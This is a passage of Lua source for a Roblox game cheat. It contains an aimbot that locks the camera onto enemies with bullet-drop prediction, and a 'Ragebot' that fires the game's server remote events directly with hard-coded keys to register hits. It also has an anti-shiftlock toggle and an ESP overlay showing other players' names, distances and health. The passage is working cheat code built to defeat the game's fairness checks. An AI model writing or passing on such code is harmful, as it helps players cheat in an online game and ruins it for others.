                        if d3<15 then
                            if d3<b3D and IsVisible(origin,pr) then b3D=d3; best=p.Character; bDist=0 end
                        elseif on and sd<bDist and IsVisible(origin,pr) then bDist=sd; best=p.Character end
                    end
                end
            end
        end
        CL.CurrentTarget=best
    end
    if CL.CurrentTarget then
        if tick()-CL.LastSwitchTime>=CL.Delay then
            local vp=GetVisibleParts(origin,CL.CurrentTarget)
            CL.LockedPart=vp[math.random(1,#vp)]; CL.LastSwitchTime=tick()
        end
        if CL.LockedPart then
            local jit=Vector3.new((math.random()-0.5)*CL.Shake,(math.random()-0.5)*CL.Shake,(math.random()-0.5)*CL.Shake)
            local tPos=CL.LockedPart.Position
            if CL.AutoPrediction then
                local ctool=char and char:FindFirstChildOfClass("Tool")
                if ctool~=CL.CachedTool then
                    CL.CachedTool=ctool; CL.CachedVel=1100
                    if ctool and ctool:FindFirstChild("Config") then
                        pcall(function()
                            local cfg=require(ctool.Config)
                            if cfg.BulletSettings and cfg.BulletSettings.Velocity then CL.CachedVel=cfg.BulletSettings.Velocity
                            elseif cfg.Velocity then CL.CachedVel=cfg.Velocity end
                        end)
                    end
                end
                tPos=tPos+(CL.LockedPart.AssemblyLinearVelocity*((tPos-origin).Magnitude/CL.CachedVel))
            end
            Camera.CFrame=CFrame.lookAt(origin, origin+Camera.CFrame.LookVector:Lerp((tPos+jit-origin).Unit,CL.Power))
        end
    end
end)

-- == Ragebot fire Heartbeat ==
RunService.Heartbeat:Connect(function()
    if not RB_State or not Valid_Pair then return end
    local char=LocalPlayer.Character
    local tool=char and char:FindFirstChildOfClass("Tool")
    if not (tool and tool:FindFirstChild("IsGun")) then return end
    local waitTime,gunConfig=0,nil
    if RF_State then
        local gn=tool.Name
        if not (gn:find("Beretta") or gn:find("TEC")) then
            local cfg=tool:FindFirstChild("Config")
            if cfg and cfg:IsA("ModuleScript") then
                local ok,gs=pcall(require,cfg)
                if ok and gs then gunConfig=gs; waitTime=1/(gs.FireRate or 3)
                else waitTime=0.1 end
            else waitTime=0.1 end
        end
    else waitTime=0.5 end
    if tick()-Last_Shot < waitTime then return end
    local vals=tool:FindFirstChild("Values"); local ammo=vals and vals:FindFirstChild("SERVER_Ammo")
    if not (ammo and ammo.Value>0) then return end
    local part=Valid_Pair.Target.Character:FindFirstChild("Head") or Valid_Pair.Target.Character:FindFirstChild("HumanoidRootPart")
    if not part then return end
    local key="K"..math.random(1000,9999)
    local dir=(Valid_Pair.Hit-Valid_Pair.Origin).Unit
    GN_S:FireServer(tick(),key,tool,"FDS9I83",Valid_Pair.Origin,{dir},false)
    if TR.Enabled then task.spawn(CreateTracer,Valid_Pair.Origin,dir) end
    ZF_H:FireServer("🧈",tool,key,1,part,Valid_Pair.Hit,dir)
    if tool:FindFirstChild("Hitmarker") then tool.Hitmarker:Fire(part) end
    if HitLogEnabled then
        local dmg,mult=17,1.35
        if gunConfig then dmg=gunConfig.Damage or 17; mult=gunConfig.HeadshotMultiplier or 1.35
        elseif tool:FindFirstChild("Config") then
            local ok,c=pcall(require,tool.Config)
            if ok then dmg=c.Damage or 17; mult=c.HeadshotMultiplier or 1.35 end
        end
        local fd=(dmg*mult)-(math.floor((Valid_Pair.Origin-Valid_Pair.Hit).Magnitude/50)*2)
        local mp=GetLocalRealPosition()
        local tr=Valid_Pair.Target.Character:FindFirstChild("HumanoidRootPart")
        ProcessHitLog(Valid_Pair.Target.Name,tool.Name,math.floor(fd*100)/100,tr and math.floor((mp-tr.Position).Magnitude) or 0,WB.Cached)
    end
    Last_Shot=tick()
end)

-- == Anti Shiftlock Heartbeat ==
RunService.Heartbeat:Connect(function()
    if not MC.AntiShift then return end
    local char=LocalPlayer.Character
    local tool=char and char:FindFirstChildOfClass("Tool")
    local hasGun=tool~=nil and tool:FindFirstChild("IsGun")~=nil
    if lastTickHadGun and not hasGun then
        task.delay(MC.ShiftDelay, function() firesignal(ChangeMouseLockEvent.Event); UIS.MouseBehavior=Enum.MouseBehavior.Default end)
    end
    lastTickHadGun=hasGun
end)

-- == ESP / Nametag Heartbeat ==
RunService.Heartbeat:Connect(function()
    if InfoPanelEnabled then
        local panelNow = tick()
        if panelNow - (InfoPanelLastUpdate or 0) >= 0.15 then
            InfoPanelLastUpdate = panelNow
            UpdateInfoPanel()
        end
    elseif InfoPanelFrame and InfoPanelFrame.Visible then
        SetInfoPanelVisible(false)
    end
    if not (NametagEnabled or DistanceEnabled or HealthEnabled) then return end
    local myChar=LocalPlayer.Character
    local myRoot=myChar and myChar:FindFirstChild("HumanoidRootPart")
    if not myRoot then return end
    local now=tick()
    if now-LastVisualUpdate >= ((myRoot.Velocity.Magnitude > (CONFIG.VelocityThreshold or 0.5)) and math.max(CONFIG.Rate_Active or 0.12, 0.12) or math.max(CONFIG.Rate_Idle or 0.20, 0.20)) then
        LastVisualUpdate=now
        for _,player in pairs(Players:GetPlayers()) do
            if player~=LocalPlayer and player.Character then
                local ch=player.Character; local h=ch:FindFirstChildOfClass("Humanoid")
                local alive=h and h.Health>0
                local show=alive and (not espSets.targetOnly or table.find(TargetList,player.Name)~=nil)
                local tag=GetCustomTag(ch,"CAT_NameTag",CONFIG.NameOffset)
                if tag then
                    local showName = NametagEnabled and show
                    local showDist = DistanceEnabled and show
                    local scaledHP = h and math.ceil(h.Health * (100/115)) or 0
                    local showHP   = HealthEnabled and show and scaledHP < 100
                    tag.Enabled = (showName or showDist)
                    local nameL = tag:FindFirstChild("L")
                    local distL = tag:FindFirstChild("DL")
                    if nameL then
                        nameL.Visible = showName
                        if showName then
                            if table.find(WhiteList,player.Name)~=nil then nameL.TextColor3=Color3.fromRGB(135,206,235)
                            elseif table.find(TargetList,player.Name)~=nil then nameL.TextColor3=Color3.fromRGB(255,0,0)
                            else nameL.TextColor3=Color3.fromRGB(255,255,255) end
                        end
                    end
                    if distL then distL.Visible = showDist end
                end
                -- HP 标签（左边）
                local hpTag = ch:FindFirstChild("CAT_HPTag")
                if hpTag then
                    local scaledHP = h and math.ceil(h.Health * (100/115)) or 0
                    local showHP   = HealthEnabled and show and scaledHP < 100
                    hpTag.Enabled  = showHP
                    if showHP then
                        local l = hpTag:FindFirstChild("L")
                        if l then l.Text = tostring(scaledHP) end
                    end
                end
                -- FF 标签（右边）
                local ffTag = ch:FindFirstChild("CAT_FFTag")
                if ffTag then
                    local hasFF = ch:FindFirstChildOfClass("ForceField") ~= nil
                    ffTag.Enabled = (NametagEnabled or DistanceEnabled or HealthEnabled) and show and hasFF
                end
            end
        end
    end
    if now-LastContentUpdate >= CONFIG.ContentRate then
        LastContentUpdate=now
        local myPos=GetLocalRealPosition()
        for _,player in pairs(Players:GetPlayers()) do
            if player.Character then
                local tag=player.Character:FindFirstChild("CAT_NameTag")
                if tag and tag.Enabled then
                    local nameL=tag:FindFirstChild("L")
                    local distL=tag:FindFirstChild("DL")
                    local tr=player.Character:FindFirstChild("HumanoidRootPart")
                    if nameL and nameL.Visible then nameL.Text=player.Name end
                    if distL and distL.Visible and tr then
                        distL.Text=math.floor((myPos-tr.Position).Magnitude).."M"
                    end
                end
            end
        end
    end
end)

local function MonitorChar(c) if c then CurrentHum=c:WaitForChild("Humanoid",10) end end
MonitorChar(LocalPlayer.Character)
LocalPlayer.CharacterAdded:Connect(MonitorChar)

return Library
